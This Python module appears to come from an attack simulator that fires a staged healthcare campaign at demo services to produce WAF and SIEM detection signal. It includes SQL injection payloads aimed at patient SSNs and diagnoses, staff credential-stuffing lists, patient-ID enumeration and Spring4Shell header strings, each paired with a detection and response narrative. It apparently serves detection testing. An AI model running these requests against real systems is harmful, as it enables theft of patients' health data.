"""
campaigns/healthcare.py — Operation HIPAA Breach
5-phase attack chain. NovaMind target: novamind-api + novamind-portal.

MITRE ATT&CK mapping
--------------------
Phase 1 — T1595.002 Active Scanning: Vulnerability Scanning (FHIR/EHR recon)
Phase 2 — T1595.001 Active Scanning / T1592.002 Gather Victim Network Info (PHI enum)
Phase 3 — T1110.004 Brute Force: Credential Stuffing (EHR staff creds)
Phase 4 — T1190 Exploit Public-Facing Application (SQLi PHI extraction)
Phase 5 — T1190 Exploit Public-Facing Application (Spring4Shell CVE-2022-22965)

Cloudflare log signal: WAF HTTP events (WAFSQLiAttackScore, WAFRCEAttackScore,
  BotScore, SecurityRuleDescription, ClientRequestPath)
SentinelOne: PowerQuery on rawLogLine parsed from Logpush HTTP dataset.
  HIPAA-relevant: ClientRequestPath contains 'patient' | stats count by ClientIP
"""

import random

from .engine import send_request, log_phase_event, sleep_between_requests

# ---------------------------------------------------------------------------
# Payloads — ported from cf-attack-sim-v2/attacks/payloads/healthcare.py
# ---------------------------------------------------------------------------

# Recon paths: NovaMind API routes first, then healthcare-specific paths
# that still generate WAF/bot-score signal even without a matching worker route.
RECON_PATHS = [
    # NovaMind real routes (novamind-api)
    "/api/v1/admin",
    "/api/v1/users",
    "/api/v1/customers",
    "/api/v1/training-data",
    "/api/v1/health",
    # NovaMind real routes (novamind-portal)
    "/login",
    "/dashboard",
    "/admin",
    # Healthcare-specific paths — FHIR R4 API (WAF signal even without a worker route)
    "/api/fhir", "/api/fhir/metadata", "/api/fhir/Patient",
    "/api/fhir/Observation", "/api/fhir/Condition",
    "/.well-known/smart-configuration",
    "/ehr", "/ehr/records", "/ehr/login",
    "/portal", "/portal/login", "/portal/patient-search",
    "/admin/reports",
    "/api/v1/patients", "/api/prescriptions", "/api/lab-results",
    "/patient-records",
]

SCANNER_AGENTS = [
    "FHIRScanner/1.0 (healthcare-recon)",
    "HL7Inspector/2.3",
    "EHRProbe/1.1 (custom scanner)",
    "python-requests/2.28.0",
    "Nikto/2.1.6",
    "MedAudit/3.0 (security scanner)",
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "zgrab/0.x",
]

PATIENT_IDS = list(range(1001, 1051))

COMMON_SURNAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Davis",
]

EHR_USERNAMES = [
    "dr.johnson", "nurse.smith", "admin.portal", "ehr.admin",
    "records.manager", "dr.williams", "lab.tech",
    "pharmacy.admin", "billing.manager",
]

EHR_PASSWORDS = [
    "Hospital2023!", "MedStaff1!", "EHRaccess!", "Clinic@123",
    "HealthAdmin1!", "Medical2024!", "NursePass1!", "Doctor@2023",
]

SQLI_PHI = [
    "' UNION SELECT ssn,dob,diagnosis FROM patients--",
    "' OR 1=1--",
    "1 UNION SELECT patient_id,full_name,insurance_id FROM patients--",
    "' OR EXISTS(SELECT * FROM patient_records WHERE diagnosis LIKE '%cancer%')--",
    "name=' UNION SELECT ssn,dob,address FROM patients--",
    "1; SELECT * FROM prescriptions--",
    "' UNION SELECT null,patient_ssn,diagnosis_code FROM medical_records--",
    "1 AND SLEEP(5)--",
    "patient_id=1 OR 1=1 UNION SELECT * FROM lab_results--",
]

SPRING4SHELL_PAYLOADS = [
    {
        "ua": "Mozilla/5.0 (Spring4Shell exploit)",
        "header_value": (
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            "%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))"
        ),
        "x_request_id": "CVE-2022-22965-exploit",
    },
    {
        "ua": "Spring Framework RCE/CVE-2022-22965",
        "header_value": "class.module.classLoader.DefaultAssertionStatus=true",
        "x_request_id": "Spring4Shell/FHIR-target",
    },
    {
        "ua": "Mozilla/5.0 (compatible; CVE-2022-22965)",
        "header_value": "class.classLoader.DefaultAssertionStatus=true",
        "x_request_id": "Spring4Shell-PHI-exfil",
    },
]


# ---------------------------------------------------------------------------
# Phase functions
# ---------------------------------------------------------------------------

def fire_phase_1_one(target, log_buffer, log_counter, stop_flag):
    """T1595.002 — healthcare-specific recon with EHR/FHIR scanner UAs."""
    path = random.choice(RECON_PATHS)
    agent = random.choice(SCANNER_AGENTS)
    send_request(
        url=f"{target}{path}",
        headers={"User-Agent": agent},
        label=f"Healthcare Recon → {path}",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=1, industry="healthcare",
    )


def fire_phase_1_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 1: Healthcare System Reconnaissance — mapping patient portal and FHIR API",
        1, "healthcare", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_1_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_2_one(target, log_buffer, log_counter, stop_flag):
    """T1592 — PHI enumeration via FHIR Patient resources and portal search."""
    patient_id = random.choice(PATIENT_IDS)
    if random.random() < 0.3:
        surname = random.choice(COMMON_SURNAMES)
        send_request(
            url=f"{target}/portal/patient-search",
            params={"name": surname},
            label=f"PHI Enumeration → patient-search?name={surname}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )
    else:
        send_request(
            url=f"{target}/api/fhir/Patient/{patient_id}",
            label=f"PHI Enumeration → FHIR Patient/{patient_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )


def fire_phase_2_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 2: Patient Data Enumeration — sequential FHIR Patient resource probing",
        2, "healthcare", log_buffer, log_counter,
    )
    for i in range(count):
        if stop_flag and stop_flag.is_set():
            break
        patient_id = 1001 + (i % 50)
        send_request(
            url=f"{target}/api/fhir/Patient/{patient_id}",
            label=f"PHI Enumeration → FHIR Patient/{patient_id}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=2, industry="healthcare",
        )
        sleep_between_requests(custom_range=delay_range)


def fire_phase_3_one(target, log_buffer, log_counter, stop_flag):
    """T1110.004 — EHR credential stuffing with staff naming conventions."""
    endpoints = ["/portal/login", "/login", "/api/v1/auth/login"]
    send_request(
        url=f"{target}{random.choice(endpoints)}",
        method="POST",
        data={
            "username": random.choice(EHR_USERNAMES),
            "password": random.choice(EHR_PASSWORDS),
            "action": "login",
        },
        label="EHR Credential Stuffing → portal/login",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=3, industry="healthcare",
    )


def fire_phase_3_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 3: EHR Credential Attack — targeted stuffing using hospital staff naming conventions",
        3, "healthcare", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_3_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_4_one(target, log_buffer, log_counter, stop_flag):
    """T1190 — SQLi on patient/PHI endpoints."""
    payload = random.choice(SQLI_PHI)
    endpoint = random.choice([
        "/portal/patient-search",
        "/api/v1/patients",
        "/api/lab-results",
        "/api/v1/customers",
    ])
    if endpoint == "/api/lab-results":
        send_request(
            url=f"{target}{endpoint}",
            method="POST",
            data={"patient_id": payload},
            label=f"SQLi PHI → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="healthcare",
        )
    else:
        send_request(
            url=f"{target}{endpoint}",
            params={"name": payload} if "search" in endpoint else {"id": payload},
            label=f"SQLi PHI → {payload[:60]}",
            log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
            phase=4, industry="healthcare",
        )


def fire_phase_4_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 4: Patient Database Exploitation — SQL injection targeting PHI records (SSN, DOB, diagnosis)",
        4, "healthcare", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_4_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


def fire_phase_5_one(target, log_buffer, log_counter, stop_flag):
    """T1190 — Spring4Shell CVE-2022-22965 via header injection on FHIR endpoint."""
    cve = random.choice(SPRING4SHELL_PAYLOADS)
    send_request(
        url=f"{target}/api/fhir/Patient",
        method="POST",
        data={"resourceType": "Patient", "id": "exploit"},
        headers={
            "User-Agent": cve["ua"],
            "X-Api-Version": cve["header_value"],
            "X-Request-ID": cve["x_request_id"],
        },
        label="Spring4Shell CVE-2022-22965 → /api/fhir/Patient",
        log_buffer=log_buffer, log_counter=log_counter, stop_flag=stop_flag,
        phase=5, industry="healthcare",
    )


def fire_phase_5_many(count, delay_range, target, log_buffer, log_counter, stop_flag):
    log_phase_event(
        "Phase 5: FHIR API Zero-Day — Spring4Shell CVE-2022-22965 targeting FHIR server",
        5, "healthcare", log_buffer, log_counter,
    )
    for _ in range(count):
        if stop_flag and stop_flag.is_set():
            break
        fire_phase_5_one(target, log_buffer, log_counter, stop_flag)
        sleep_between_requests(custom_range=delay_range)


# ---------------------------------------------------------------------------
# PHASES manifest
# ---------------------------------------------------------------------------

PHASES = [
    {
        "number": 1,
        "name": "Healthcare System Reconnaissance",
        "description": (
            "Attacker mapping patient portal, EHR system, and FHIR API endpoints."
        ),
        "mitre_technique": "T1595.002 — Active Scanning: Vulnerability Scanning",
        "target_route": "novamind-api /api/v1/*, novamind-portal /login /dashboard",
        "what_fires": (
            "FHIR endpoint discovery, patient portal probing, HL7 interface scanning, "
            ".well-known/smart-configuration. Bot score 3/100."
        ),
        "cloudflare_story": (
            "Scanner fingerprint on healthcare-specific endpoints. FHIR API enumeration detected. "
            "Bot score 3/100."
        ),
        "sentinelone_story": (
            "Attacker specifically targeting FHIR R4 API — this is targeted, not opportunistic. "
            "Alert to privacy officer."
        ),
        "hyperautomation": (
            "FHIR endpoint scanning pattern → Alert privacy officer, log for HIPAA audit trail, "
            "auto-challenge IP"
        ),
        "fire_one":  fire_phase_1_one,
        "fire_many": fire_phase_1_many,
    },
    {
        "number": 2,
        "name": "Patient Data Enumeration",
        "description": (
            "Attacker probing patient records API with sequential patient IDs to map PHI availability."
        ),
        "mitre_technique": "T1595.001 — Active Scanning / T1592.002 Gather Victim Network Info",
        "target_route": "novamind-api /api/fhir/Patient/:id, /portal/patient-search",
        "what_fires": (
            "Sequential GET /api/fhir/Patient/1001→1050, "
            "/portal/patient-search?name=Smith (surname enumeration)."
        ),
        "cloudflare_story": (
            "Unusual sequential FHIR Patient resource access — 50 requests in 45 seconds. "
            "Enumeration pattern detected."
        ),
        "sentinelone_story": (
            "Pattern matches known PHI harvesting technique. Same source IP as Phase 1. "
            "Incident escalating to medium severity."
        ),
        "hyperautomation": (
            "Sequential patient record access → Block IP, notify Privacy Officer, "
            "flag for HIPAA breach assessment"
        ),
        "fire_one":  fire_phase_2_one,
        "fire_many": fire_phase_2_many,
    },
    {
        "number": 3,
        "name": "EHR System Credential Attack",
        "description": (
            "Targeted credential stuffing against EHR system login with staff naming patterns."
        ),
        "mitre_technique": "T1110.004 — Brute Force: Credential Stuffing",
        "target_route": "novamind-portal /login, novamind-api /api/v1/auth/login",
        "what_fires": (
            "POST /portal/login with healthcare staff usernames (dr.johnson, nurse.smith), "
            "hospital password patterns. Distributed across multiple IPs."
        ),
        "cloudflare_story": (
            "Rate limiting on /portal/login — 150 attempts in 90 seconds. "
            "Distributed across multiple IPs."
        ),
        "sentinelone_story": (
            "Credential stuffing using hospital staff naming convention. "
            "Attacker has insider knowledge of org structure."
        ),
        "hyperautomation": (
            "Healthcare portal credential stuffing → Lock all non-MFA accounts, "
            "alert IT security, force re-authentication"
        ),
        "fire_one":  fire_phase_3_one,
        "fire_many": fire_phase_3_many,
    },
    {
        "number": 4,
        "name": "Patient Database Exploitation",
        "description": (
            "SQL injection attack attempting bulk patient PHI extraction (SSN, DOB, diagnosis)."
        ),
        "mitre_technique": "T1190 — Exploit Public-Facing Application (SQLi)",
        "target_route": "novamind-api /api/v1/patients, /portal/patient-search",
        "what_fires": (
            "SQLi on /portal/patient-search (UNION SELECT ssn,dob,diagnosis), "
            "POST /api/lab-results with injection. WAFSQLiAttackScore: 97."
        ),
        "cloudflare_story": (
            "OWASP SQLi rule fired on patient search. WAFSQLiAttackScore: 97. "
            "Attempted PHI exfiltration blocked."
        ),
        "sentinelone_story": (
            "Attacker attempting to UNION-inject patient SSN, DOB, and diagnosis data. "
            "HIPAA breach attempt — Critical severity."
        ),
        "hyperautomation": (
            "SQLi on patient data endpoint → Critical HIPAA incident, freeze API, "
            "notify breach response team, start 72-hour HIPAA clock"
        ),
        "fire_one":  fire_phase_4_one,
        "fire_many": fire_phase_4_many,
    },
    {
        "number": 5,
        "name": "FHIR API Zero-Day Exploitation",
        "description": (
            "Spring4Shell exploit targeting Java Spring Framework FHIR API server "
            "for complete PHI database access."
        ),
        "mitre_technique": "T1190 — Exploit Public-Facing Application (Spring4Shell CVE-2022-22965)",
        "target_route": "novamind-api /api/fhir/Patient (recon signal)",
        "what_fires": (
            "CVE-2022-22965 Spring4Shell in User-Agent + X-Api-Version headers "
            "on /api/fhir/Patient endpoint."
        ),
        "cloudflare_story": (
            "CVE-2022-22965 signature rule block. WAFRCEAttackScore: 99. "
            "FirewallForAIInjectionScore: 100."
        ),
        "sentinelone_story": (
            "Nation-state or well-funded criminal group. Spring4Shell on FHIR server = "
            "complete PHI database access if successful. Full 5-phase campaign correlated."
        ),
        "hyperautomation": (
            "Spring4Shell on FHIR → Isolate FHIR API server, invoke HIPAA breach response plan, "
            "notify HHS within 72 hours, push emergency Cloudflare block rule"
        ),
        "fire_one":  fire_phase_5_one,
        "fire_many": fire_phase_5_many,
    },
]
